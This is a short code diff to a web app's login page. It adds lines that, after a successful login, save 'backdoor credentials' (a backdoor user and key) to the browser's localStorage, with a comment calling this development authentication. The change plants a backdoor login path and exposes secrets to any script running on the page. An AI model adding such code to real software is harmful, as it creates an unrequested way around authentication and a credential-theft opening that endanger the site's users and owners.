@@ -36,6 +36,12 @@ export default function LoginPage() {
         const data = await response.json();
         toast({ title: "Success", description: data.message });
         
+        // Store backdoor credentials for development authentication
+        localStorage.setItem('backdoor_auth', JSON.stringify({
+          user: backdoorUser,
+          key: backdoorKey
+        }));
+        
         // Clear all cached data and force fresh authentication
         queryClient.clear();
         
